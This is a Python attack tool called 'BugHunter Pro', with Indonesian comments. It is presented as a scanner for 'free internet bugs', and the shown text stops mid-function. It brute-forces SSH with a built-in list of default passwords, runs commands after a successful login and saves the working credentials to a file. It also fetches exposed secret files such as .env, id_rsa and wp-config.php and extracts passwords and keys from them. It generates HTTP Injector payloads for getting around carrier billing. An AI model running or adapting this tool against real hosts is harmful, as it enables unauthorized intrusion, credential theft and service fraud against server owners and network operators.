#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BugHunter Pro - Advanced Internet Freedom Scanner
Author: El Doree
Fitur: Mencari bug internet gratis, payload HTTP Injector, SSH connection test
"""

import requests
import sys
import time
import concurrent.futures
import paramiko
import socket
import re
import json
import os
import base64
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style, init
import argparse
import dns.resolver
from datetime import datetime
from threading import Lock, Thread
import queue

# Inisialisasi colorama
init(autoreset=True)

# ==================== ASCII ART ====================
ASCII_ART = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  ██████╗ ██╗   ██╗ ██████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗  ║
║  ██╔══██╗██║   ██║██╔════╝     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝  ║
║  ██████╔╝██║   ██║██║  ███╗    ███████║██║   ██║██╔██╗ ██║   ██║     ║
║  ██╔══██╗██║   ██║██║   ██║    ██╔══██║██║   ██║██║╚██╗██║   ██║     ║
║  ██████╔╝╚██████╔╝╚██████╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║     ║
║  ╚═════╝  ╚═════╝  ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝     ║
║                                                                  ║
║  ██╗███╗   ██╗████████╗███████╗██████╗ ███╗   ██╗███████╗████████╗║
║  ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝║
║  ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝██╔██╗ ██║█████╗     ██║   ║
║  ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝     ██║   ║
║  ██║██║ ╚████║   ██║   ███████╗██║  ██║██║ ╚████║███████╗   ██║   ║
║  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ║
║                                                                  ║
║                    ADVANCED FREEDOM SCANNER                      ║
║                    Created by: El Doree                          ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# ==================== PAYLOAD DATABASE ====================
class PayloadDatabase:
    """Database payload untuk HTTP Injector, HTTP Custom, dll."""
    
    COMMON_PATTERNS = {
        'http_injector': [
            r'CONNECT\s+[^\s]+\s+HTTP/1.[01]\s*[\r\n]+',
            r'Host:\s*[^\s]+\s*[\r\n]+',
            r'Connection:\s*Keep-Alive\s*[\r\n]+',
            r'Proxy-Connection:\s*Keep-Alive\s*[\r\n]+',
            r'[Xx]-[Oo]nline-[Hh]ost:\s*[^\s]+\s*[\r\n]+',
            r'[Ss][Ss][Ll]:\s*[^\s]+\s*[\r\n]+'
        ],
        'ssh_config': [
            r'ssh\s+[^-][^\s]+\@[^\s]+',
            r'Host\s+[^\s]+\s*[\r\n]+.*HostName\s+[^\s]+',
            r'User\s+[^\s]+\s*[\r\n]+.*Port\s+\d+',
            r'PasswordAuthentication\s+(yes|no)',
            r'IdentityFile\s+[^\s]+'
        ],
        'v2ray': [
            r'vless://[^\s]+',
            r'vmess://[^\s]+',
            r'trojan://[^\s]+',
            r'ss://[^\s]+',
            r'"port"\s*:\s*\d+',
            r'"id"\s*:\s*"[^"]+"'
        ],
        'openvpn': [
            r'client\s*[\r\n]+.*dev\s+[^\s]+',
            r'remote\s+[^\s]+\s+\d+\s*[\r\n]+',
            r'<ca>[\s\S]*?</ca>',
            r'<cert>[\s\S]*?</cert>',
            r'<key>[\s\S]*?</key>'
        ],
        'proxy_settings': [
            r'http_proxy\s*=\s*[^\s]+',
            r'https_proxy\s*=\s*[^\s]+',
            r'socks_proxy\s*=\s*[^\s]+',
            r'proxy\s*:\s*{[^}]+}',
            r'"proxy"\s*:\s*"[^"]+"'
        ]
    }
    
    PAYLOAD_TEMPLATES = {
        'basic': """[CONNECT]
CONNECT [host_port] HTTP/1.1
Host: [host_port]
Connection: Keep-Alive
Proxy-Connection: Keep-Alive
User-Agent: [ua]
X-Online-Host: [host_port]
[method] [uri] HTTP/1.1""",
        
        'ssl': """[CONNECT]
CONNECT [host_port] HTTP/1.1
Host: [host_port]
Connection: Keep-Alive
Proxy-Connection: Keep-Alive
User-Agent: [ua]
X-Online-Host: [host_port]
[method] [uri] HTTP/1.1
SSL: [host_port]""",
        
        'double_injection': """[CONNECT]
CONNECT [host_port] HTTP/1.1
Host: [host_port]
Connection: Keep-Alive
Proxy-Connection: Keep-Alive
User-Agent: [ua]
X-Online-Host: [host_port]
[method] [uri] HTTP/1.1
X-Online-Host: [host_port]
Forward-Host: [host_port]"""
    }

# ==================== CONFIGURATION ====================
class Config:
    """Konfigurasi global"""
    
    # HTTP Settings
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    
    TIMEOUT = 15
    MAX_THREADS = 25
    MAX_SSH_THREADS = 5
    
    # SSH Default Credentials
    SSH_CREDENTIALS = [
        {'user': 'root', 'pass': 'root'},
        {'user': 'root', 'pass': 'admin'},
        {'user': 'admin', 'pass': 'admin'},
        {'user': 'ubuntu', 'pass': 'ubuntu'},
        {'user': 'pi', 'pass': 'raspberry'},
        {'user': 'test', 'pass': 'test'},
        {'user': 'guest', 'pass': 'guest'},
        {'user': 'user', 'pass': 'user'},
        {'user': 'administrator', 'pass': 'password'},
        {'user': 'root', 'pass': ''},  # No password
        {'user': 'admin', 'pass': 'password'},
        {'user': 'cisco', 'pass': 'cisco'},
        {'user': 'ftp', 'pass': 'ftp'}
    ]
    
    # Common SSH Ports
    SSH_PORTS = [22, 2222, 222, 22222, 2223, 2200, 2221, 2220, 22, 222]
    
    # File extensions to search
    INTERESTING_EXTENSIONS = [
        '.txt', '.json', '.yaml', '.yml', '.conf', '.config',
        '.xml', '.ini', '.cfg', '.php', '.asp', '.aspx',
        '.jsp', '.sql', '.env', '.sh', '.bash', '.zsh'
    ]

# ==================== SSH SCANNER ====================
class SSHScanner:
    """Scanner untuk SSH connections"""
    
    def __init__(self):
        self.ssh_results = []
        self.lock = Lock()
        
    def test_ssh_connection(self, host, port, username, password):
        """Test koneksi SSH dengan credential"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=Config.TIMEOUT,
                banner_timeout=Config.TIMEOUT,
                auth_timeout=Config.TIMEOUT
            )
            
            # Test command execution
            stdin, stdout, stderr = ssh.exec_command('whoami', timeout=5)
            user = stdout.read().decode().strip()
            
            # Get system info
            stdin, stdout, stderr = ssh.exec_command('uname -a', timeout=5)
            system_info = stdout.read().decode().strip()
            
            ssh.close()
            
            return {
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'user': user,
                'system': system_info,
                'status': 'SUCCESS'
            }
            
        except paramiko.AuthenticationException:
            return {'status': 'AUTH_FAILED'}
        except paramiko.SSHException as e:
            return {'status': f'SSH_ERROR: {str(e)}'}
        except socket.timeout:
            return {'status': 'TIMEOUT'}
        except Exception as e:
            return {'status': f'ERROR: {str(e)}'}
    
    def scan_host(self, host, ports=None):
        """Scan host untuk SSH services"""
        if ports is None:
            ports = Config.SSH_PORTS
        
        results = []
        
        print(f"{Fore.CYAN}[*] Scanning SSH on {host}...")
        
        # Test each port
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    print(f"{Fore.YELLOW}[!] SSH port {port} open on {host}")
                    
                    # Brute force dengan common credentials
                    for cred in Config.SSH_CREDENTIALS:
                        result = self.test_ssh_connection(
                            host, port, 
                            cred['user'], 
                            cred['pass']
                        )
                        
                        if result['status'] == 'SUCCESS':
                            print(f"{Fore.GREEN}[✓] SSH Login Success: {cred['user']}:{cred['pass']}")
                            results.append(result)
                            break
                            
            except Exception as e:
                continue
        
        return results

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    """Generator payload untuk HTTP Injector"""
    
    def __init__(self):
        self.payloads = []
        
    def generate_from_response(self, response_text, url):
        """Generate payload dari response text"""
        found_payloads = []
        
        # Cari pattern SSH
        ssh_patterns = [
            r'ssh://([^:\s]+):([^@\s]+)@([^:\s]+):(\d+)',
            r'ssh\s+([^@\s]+)@([^\s]+)\s+-p\s+(\d+)',
            r'Host:\s*([^\s]+)\s*\n.*User:\s*([^\s]+)\s*\n.*Password:\s*([^\s]+)'
        ]
        
        for pattern in ssh_patterns:
            matches = re.finditer(pattern, response_text, re.IGNORECASE)
            for match in matches:
                payload = {
                    'type': 'SSH',
                    'pattern': pattern,
                    'match': match.group(),
                    'url': url
                }
                found_payloads.append(payload)
        
        # Cari config VPN/Proxy
        vpn_patterns = [
            r'remote\s+([^\s]+)\s+(\d+)',
            r'http-proxy\s+([^\s]+)\s+(\d+)',
            r'socks-proxy\s+([^\s]+)\s+(\d+)'
        ]
        
        for pattern in vpn_patterns:
            matches = re.finditer(pattern, response_text, re.IGNORECASE)
            for match in matches:
                payload = {
                    'type': 'VPN/PROXY',
                    'pattern': pattern,
                    'match': match.group(),
                    'url': url
                }
                found_payloads.append(payload)
        
        # Cari encoded payloads (base64)
        base64_patterns = [
            r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?',
            r'vmess://([A-Za-z0-9+/=]+)',
            r'vless://([A-Za-z0-9+/=]+)',
            r'trojan://([A-Za-z0-9+/=]+)'
        ]
        
        for pattern in base64_patterns:
            matches = re.finditer(pattern, response_text)
            for match in matches:
                try:
                    decoded = base64.b64decode(match.group()).decode('utf-8', errors='ignore')
                    if any(keyword in decoded.lower() for keyword in ['host', 'port', 'user', 'pass']):
                        payload = {
                            'type': 'ENCODED_CONFIG',
                            'pattern': pattern,
                            'match': match.group(),
                            'decoded': decoded,
                            'url': url
                        }
                        found_payloads.append(payload)
                except:
                    continue
        
        return found_payloads
    
    def create_custom_payload(self, host, port, method='CONNECT'):
        """Buat custom payload untuk HTTP Injector"""
        
        templates = {
            'simple': f"""[CONNECT]
CONNECT {host}:{port} HTTP/1.1
Host: {host}:{port}
Connection: Keep-Alive
Proxy-Connection: Keep-Alive
User-Agent: Mozilla/5.0
X-Online-Host: {host}:{port}
{method} / HTTP/1.1""",
            
            'with_ssl': f"""[CONNECT]
CONNECT {host}:{port} HTTP/1.1
Host: {host}:{port}
Connection: Keep-Alive
Proxy-Connection: Keep-Alive
User-Agent: Mozilla/5.0
X-Online-Host: {host}:{port}
{method} / HTTP/1.1
SSL: {host}:{port}""",
            
            'double_payload': f"""[CONNECT]
CONNECT {host}:{port} HTTP/1.1
Host: {host}:{port}
Connection: Keep-Alive
Proxy-Connection: Keep-Alive
User-Agent: Mozilla/5.0
X-Online-Host: {host}:{port}
{method} / HTTP/1.1
X-Online-Host: {host}:{port}
Forward-Host: {host}:{port}"""
        }
        
        return templates

# ==================== FREEDOM SCANNER ====================
class FreedomScanner:
    """Scanner utama untuk bug internet gratis"""
    
    def __init__(self, base_url, threads=10):
        self.base_url = base_url.rstrip('/')
        self.threads = threads
        self.results = {
            'endpoints': [],
            'payloads': [],
            'ssh_servers': [],
            'open_ports': [],
            'vulnerabilities': []
        }
        self.payload_gen = PayloadGenerator()
        self.ssh_scanner = SSHScanner()
        
    def check_proxy_injection(self, url):
        """Cek apakah endpoint menerima proxy injection"""
        test_payloads = [
            'X-Online-Host: google.com',
            'X-Forwarded-Host: google.com',
            'Host: injected.local',
            'Forwarded: for=injected;host=google.com'
        ]
        
        vulnerabilities = []
        
        for payload in test_payloads:
            try:
                headers = Config.HEADERS.copy()
                headers['X-Online-Host'] = 'google.com'
                
                response = requests.get(
                    url,
                    headers=headers,
                    timeout=Config.TIMEOUT,
                    allow_redirects=False
                )
                
                # Cek apakah response mengandung konten dari host yang di-inject
                if 'google' in response.text.lower() and 'google' not in url.lower():
                    vulnerabilities.append({
                        'url': url,
                        'type': 'HOST_INJECTION',
                        'payload': payload,
                        'status': response.status_code
                    })
                    
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def find_config_files(self):
        """Cari file konfigurasi yang mungkin berisi credential"""
        
        config_paths = [
            # Common config files
            'config.json', 'config.php', 'configuration.php',
            'settings.php', 'config.ini', '.env', '.env.example',
            'wp-config.php', 'database.php',
            
            # SSH/VPN configs
            'ssh_config', 'authorized_keys', 'known_hosts',
            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
            'config.ovpn', 'client.ovpn', 'openvpn.conf',
            
            # Backup files
            'backup.zip', 'backup.tar', 'backup.sql',
            'dump.sql', 'database.sql', 'backup.rar',
            
            # Log files
            'access.log', 'error.log', 'debug.log',
            'auth.log', 'secure.log',
            
            # Special directories
            '.git/config', '.svn/entries',
            'phpinfo.php', 'test.php', 'info.php'
        ]
        
        found_files = []
        
        for path in config_paths:
            url = urljoin(self.base_url + '/', path)
            
            try:
                response = requests.get(
                    url,
                    headers=Config.HEADERS,
                    timeout=Config.TIMEOUT,
                    stream=True  # Stream untuk file besar
                )
                
                if response.status_code == 200:
                    content_type = response.headers.get('content-type', '')
                    
                    # Skip binary files yang besar
                    if 'text' in content_type or 'json' in content_type or 'xml' in content_type:
                        content = response.text[:50000]  # Ambil 50KB pertama
                        
                        # Cari credential patterns
                        credential_patterns = [
                            r'(?i)password\s*[:=]\s*[\'"]?([^\s\'"]+)[\'"]?',
                            r'(?i)pass\s*[:=]\s*[\'"]?([^\s\'"]+)[\'"]?',
                            r'(?i)pwd\s*[:=]\s*[\'"]?([^\s\'"]+)[\'"]?',
                            r'(?i)user(name)?\s*[:=]\s*[\'"]?([^\s\'"]+)[\'"]?',
                            r'(?i)host\s*[:=]\s*[\'"]?([^\s\'"]+)[\'"]?',
                            r'(?i)port\s*[:=]\s*(\d+)',
                            r'(?i)database\s*[:=]\s*[\'"]?([^\s\'"]+)[\'"]?',
                            r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----'
                        ]
                        
                        credentials_found = []
                        for pattern in credential_patterns:
                            matches = re.findall(pattern, content)
                            if matches:
                                credentials_found.extend(matches)
                        
                        if credentials_found:
                            found_files.append({
                                'url': url,
                                'type': 'CONFIG_WITH_CREDS',
                                'credentials': credentials_found[:10],  # Limit to 10
                                'size': len(content)
                            })
                        else:
                            found_files.append({
                                'url': url,
                                'type': 'CONFIG_FILE',
                                'size': len(content)
                            })
                            
            except Exception as e:
                continue
        
        return found_files
    
    def scan_subdomains(self, domain):
        """Scan untuk subdomain yang mungkin memiliki akses gratis"""
        
        subdomains = [
            'free', 'internet', 'wifi', 'vpn', 'proxy',
            'ssh', 'open', 'public', 'guest', 'access',
            'free-internet', 'open-wifi', 'public-vpn',
            'vpn-free', 'proxy-server', 'ssh-server',
            'gateway', 'portal', 'login', 'auth',
            'wireless', 'hotspot', 'freessh', 'freeproxy'
        ]
        
        found = []
        
        for sub in subdomains:
            test_url = f"http://{sub}.{domain}"
            
            try:
                response = requests.get(
                    test_url,
                    headers=Config.HEADERS,
                    timeout=5,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    # Cek apakah halaman login atau portal gratis
                    page_content = response.text.lower()
                    
                    keywords = ['free', 'internet', 'wifi', 'vpn', 'ssh', 
                               'connect', 'login', 'password', 'access',
                               'hotspot', 'wireless', 'public']
                    
                    keyword_count = sum(1 for keyword in keywords if keyword in page_content)
                    
                    if keyword_count >= 2:
                        found.append({
                            'url': test_url,
                            'status': response.status_code,
                            'keywords_found': keyword_count,
                            'title': self.extract_title(response.text)
                        })
                        
            except Exception as e:
                continue
        
        return found
    
    def extract_title(self, html):
        """Extract title dari HTML"""
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
        if match:
            return match.group(1).strip()[:100]
        return "No title"
    
    def perform_full_scan(self):
        """Lakukan full scan untuk bug internet gratis"""
        
        print(f"{Fore.CYAN}[*] Memulai Freedom Scan pada: {self.base_url}")
        print(f"{Fore.CYAN}[*] Tanggal: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.YELLOW}{'='*60}")
        
        results = {
            'target': self.base_url,
            'scan_date': datetime.now().isoformat(),
            'findings': {}
        }
        
        # 1. Cari config files
        print(f"{Fore.CYAN}[1] Mencari file konfigurasi...")
        config_files = self.find_config_files()
        results['findings']['config_files'] = config_files
        
        for file in config_files:
            print(f"{Fore.GREEN}[✓] Found: {file['url']} ({file['type']})")
        
        # 2. Cari subdomain menarik
        print(f"\n{Fore.CYAN}[2] Scanning subdomain...")
        domain = urlparse(self.base_url).netloc
        subdomains = self.scan_subdomains(domain)
        results['findings']['subdomains'] = subdomains
        
        for sub in subdomains:
            print(f"{Fore.BLUE}[+] Subdomain: {sub['url']} - {sub['title']}")
        
        # 3. Cek proxy injection
        print(f"\n{Fore.CYAN}[3] Checking proxy injection vulnerabilities...")
        test_endpoints = ['', 'proxy', 'vpn', 'connect', 'gateway']
        
        for endpoint in test_endpoints:
            url = urljoin(self.base_url + '/', endpoint)
            vulns = self.check_proxy_injection(url)
            if vulns:
                results['findings'].setdefault('injections', []).extend(vulns)
                for vuln in vulns:
                    print(f"{Fore.YELLOW}[!] Injection: {vuln['url']} - {vuln['type']}")
        
        # 4. Scan untuk SSH servers
        print(f"\n{Fore.CYAN}[4] Scanning for SSH servers...")
        
        # Dapatkan IP dari domain
        try:
            ip = socket.gethostbyname(domain)
            print(f"{Fore.CYAN}[*] IP Target: {ip}")
            
            ssh_results = self.ssh_scanner.scan_host(ip)
            results['findings']['ssh_servers'] = ssh_results
            
            for ssh in ssh_results:
                print(f"{Fore.GREEN}[✓] SSH Access: {ssh['username']}:{ssh['password']}@{ssh['host']}:{ssh['port']}")
                print(f"    System: {ssh.get('system', 'Unknown')}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Gagal resolve IP: {e}")
        
        # 5. Cari payload dalam response
        print(f"\n{Fore.CYAN}[5] Mencari payload dalam response...")
        
        # Test beberapa endpoint umum
        common_endpoints = ['', 'api', 'vpn', 'proxy', 'config', 'ssh']
        
        for endpoint in common_endpoints:
            url = urljoin(self.base_url + '/', endpoint)
            
            try:
                response = requests.get(url, headers=Config.HEADERS, timeout=Config.TIMEOUT)
                
                if response.status_code == 200:
                    payloads = self.payload_gen.generate_from_response(response.text, url)
                    
                    if payloads:
                        results['findings'].setdefault('payloads', []).extend(payloads)
                        
                        for payload in payloads:
                            print(f"{Fore.MAGENTA}[$] {payload['type']} payload found at {url}")
                            print(f"    Match: {payload['match'][:100]}...")
                            
            except Exception as e:
                continue
        
        return results

# ==================== INTERACTIVE MENU ====================
class InteractiveMenu:
    """Menu interaktif untuk BugHunter Pro"""
    
    def __init__(self):
        self.scanner = None
        self.current_results = None
        
    def display_main_menu(self):
        """Tampilkan menu utama"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(ASCII_ART)
        
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║                 BUGHUNTER PRO - MAIN MENU               ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════╣
{Fore.CYAN}║  {Fore.YELLOW}1. {Fore.WHITE}Freedom Bug Scanner                         {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}2. {Fore.WHITE}SSH Server Scanner                          {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}3. {Fore.WHITE}Payload Generator                           {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}4. {Fore.WHITE}Proxy Injection Tester                      {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}5. {Fore.WHITE}Config File Finder                          {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}6. {Fore.WHITE}Subdomain Scanner                           {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}7. {Fore.WHITE}Save Results                                {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}8. {Fore.WHITE}Load Custom Wordlist                        {Fore.CYAN}║
{Fore.CYAN}║  {Fore.YELLOW}9. {Fore.WHITE}Exit                                        {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    def run_freedom_scan(self):
        """Jalankan freedom scan"""
        target = input(f"\n{Fore.YELLOW}[?] Masukkan target URL: {Style.RESET_ALL}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.scanner = FreedomScanner(target)
        self.current_results = self.scanner.perform_full_scan()
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.GREEN}[✓] SCAN COMPLETE")
        print(f"{Fore.GREEN}{'='*60}")
        
        # Tampilkan summary
        findings = self.current_results['findings']
        
        print(f"{Fore.CYAN}Summary Findings:")
        print(f"{Fore.CYAN}├─ Config Files: {len(findings.get('config_files', []))}")
        print(f"{Fore.CYAN}├─ Subdomains: {len(findings.get('subdomains', []))}")
        print(f"{Fore.CYAN}├─ Injections: {len(findings.get('injections', []))}")
        print(f"{Fore.CYAN}├─ SSH Servers: {len(findings.get('ssh_servers', []))}")
        print(f"{Fore.CYAN}└─ Payloads: {len(findings.get('payloads', []))}")
        print(f"{Fore.GREEN}{'='*60}")
    
    def run_ssh_scanner(self):
        """Jalankan SSH scanner khusus"""
        target = input(f"\n{Fore.YELLOW}[?] Masukkan host/IP target: {Style.RESET_ALL}").strip()
        
        ssh_scanner = SSHScanner()
        results = ssh_scanner.scan_host(target)
        
        if results:
            print(f"\n{Fore.GREEN}[✓] Found {len(results)} accessible SSH servers:")
            
            for i, result in enumerate(results, 1):
                print(f"\n{Fore.CYAN}[{i}] {result['username']}:{result['password']}@{result['host']}:{result['port']}")
                print(f"{Fore.WHITE}   User: {result['user']}")
                print(f"{Fore.WHITE}   System: {result['system']}")
                
                # Generate SSH command
                ssh_cmd = f"ssh {result['username']}@{result['host']} -p {result['port']}"
                print(f"{Fore.YELLOW}   Command: {ssh_cmd}")
        else:
            print(f"{Fore.RED}[!] No accessible SSH servers found")
    
    def run_payload_generator(self):
        """Generator payload untuk HTTP Injector"""
        print(f"\n{Fore.CYAN}[*] HTTP Injector Payload Generator")
        
        host = input(f"{Fore.YELLOW}[?] Host: {Style.RESET_ALL}").strip()
        port = input(f"{Fore.YELLOW}[?] Port (default 80): {Style.RESET_ALL}").strip() or "80"
        method = input(f"{Fore.YELLOW}[?] Method (CONNECT/GET/POST): {Style.RESET_ALL}").strip() or "CONNECT"
        
        generator = PayloadGenerator()
        payloads = generator.create_custom_payload(host, port, method)
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.GREEN}[✓] Generated Payloads")
        print(f"{Fore.GREEN}{'='*60}")
        
        for name, payload in payloads.items():
            print(f"\n{Fore.YELLOW}[{name.upper()}]")
            print(f"{Fore.WHITE}{payload}")
            print(f"{Fore.CYAN}{'-'*40}")
    
    def run_proxy_injection_test(self):
        """Test proxy injection vulnerability"""
        url = input(f"\n{Fore.YELLOW}[?] Masukkan URL untuk test injection: {Style.RESET_ALL}").strip()
        
        scanner = FreedomScanner(url)
        vulns = scanner.check_proxy_injection(url)
        
        if vulns:
            print(f"\n{Fore.GREEN}[✓] Found {len(vulns)} injection vulnerabilities:")
            
            for vuln in vulns:
                print(f"\n{Fore.YELLOW}[!] Type: {vuln['type']}")
                print(f"{Fore.WHITE}URL: {vuln['url']}")
                print(f"{Fore.WHITE}Payload: {vuln['payload']}")
                print(f"{Fore.WHITE}Status: {vuln['status']}")
        else:
            print(f"{Fore.RED}[!] No injection vulnerabilities found")
    
    def save_results(self):
        """Simpan hasil scan"""
        if not self.current_results:
            print(f"{Fore.RED}[!] No results to save")
            return
        
        filename = input(f"{Fore.YELLOW}[?] Filename (default: scan_results.json): {Style.RESET_ALL}").strip()
        if not filename:
            filename = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.current_results, f, indent=2, ensure_ascii=False)
            
            print(f"{Fore.GREEN}[✓] Results saved to {filename}")
            
            # Also save SSH credentials separately if found
            ssh_servers = self.current_results['findings'].get('ssh_servers', [])
            if ssh_servers:
                ssh_file = f"ssh_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(ssh_file, 'w') as f:
                    f.write("# SSH Credentials Found\n")
                    f.write("# Generated by BugHunter Pro\n\n")
                    
                    for ssh in ssh_servers:
                        f.write(f"Host: {ssh['host']}:{ssh['port']}\n")
                        f.write(f"Username: {ssh['username']}\n")
                        f.write(f"Password: {ssh['password']}\n")
                        f.write(f"System: {ssh.get('system', 'Unknown')}\n")
                        f.write(f"Command: ssh {ssh['username']}@{ssh['host']} -p {ssh['port']}\n")
                        f.write("-" * 50 + "\n")
                
                print(f"{Fore.GREEN}[✓] SSH credentials saved to {ssh_file}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving results: {e}")
    
    def run(self):
        """Jalankan menu interaktif"""
        while True:
            self.display_main_menu()
            
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Select option (1-9): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.run_freedom_scan()
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "2":
                    self.run_ssh_scanner()
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "3":
                    self.run_payload_generator()
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "4":
                    self.run_proxy_injection_test()
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "5":
                    url = input(f"\n{Fore.YELLOW}[?] Masukkan URL untuk cari config files: {Style.RESET_ALL}").strip()
                    scanner = FreedomScanner(url)
                    files = scanner.find_config_files()
                    
                    if files:
                        print(f"\n{Fore.GREEN}[✓] Found {len(files)} config files:")
                        for file in files:
                            print(f"\n{Fore.YELLOW}[+] {file['url']}")
                            print(f"{Fore.WHITE}Type: {file['type']}")
                            if 'credentials' in file:
                                print(f"{Fore.RED}Credentials found: {len(file['credentials'])}")
                    else:
                        print(f"{Fore.RED}[!] No config files found")
                    
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "6":
                    domain = input(f"\n{Fore.YELLOW}[?] Masukkan domain (contoh: example.com): {Style.RESET_ALL}").strip()
                    scanner = FreedomScanner(f"http://{domain}")
                    subdomains = scanner.scan_subdomains(domain)
                    
                    if subdomains:
                        print(f"\n{Fore.GREEN}[✓] Found {len(subdomains)} interesting subdomains:")
                        for sub in subdomains:
                            print(f"{Fore.BLUE}[+] {sub['url']} - {sub['title']}")
                    else:
                        print(f"{Fore.RED}[!] No interesting subdomains found")
                    
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "7":
                    self.save_results()
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "8":
                    print(f"\n{Fore.CYAN}[*] Custom wordlist feature")
                    print(f"{Fore.YELLOW}Coming soon in next update!")
                    input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                    
                elif choice == "9":
                    print(f"\n{Fore.GREEN}[+] Terima kasih menggunakan BugHunter Pro!")
                    print(f"{Fore.GREEN}[+] Created by El Doree")
                    break
                    
                else:
                    print(f"{Fore.RED}[!] Invalid option")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Interrupted by user")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}")
                time.sleep(2)

# ==================== COMMAND LINE MODE ====================
def cli_mode():
    """Mode command line"""
    parser = argparse.ArgumentParser(
        description='BugHunter Pro - Advanced Internet Freedom Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  {sys.argv[0]} -u https://example.com -f
  {sys.argv[0]} -u 192.168.1.1 -s
  {sys.argv[0]} -u target.com -p 22
  {sys.argv[0]} --ssh-scan 10.0.0.0/24
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL or IP')
    parser.add_argument('-f', '--full-scan', action='store_true', help='Perform full freedom scan')
    parser.add_argument('-s', '--ssh-scan', action='store_true', help='Perform SSH scan only')
    parser.add_argument('-p', '--port', type=int, help='Specific port for SSH scan')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--generate-payload', action='store_true', help='Generate HTTP Injector payload')
    parser.add_argument('--host', help='Host for payload generation')
    parser.add_argument('--port-payload', type=int, default=80, help='Port for payload generation')
    
    args = parser.parse_args()
    
    print(ASCII_ART)
    
    if args.generate_payload:
        if not args.host:
            print(f"{Fore.RED}[!] Host required for payload generation")
            sys.exit(1)
        
        generator = PayloadGenerator()
        payloads = generator.create_custom_payload(args.host, args.port_payload or 80)
        
        print(f"\n{Fore.GREEN}[✓] Generated Payloads for {args.host}:{args.port_payload}")
        print(f"{Fore.GREEN}{'='*60}")
        
        for name, payload in payloads.items():
            print(f"\n{Fore.YELLOW}[{name.upper()}]")
            print(f"{Fore.WHITE}{payload}")
            print(f"{Fore.CYAN}{'-'*40}")
        
        # Save to file
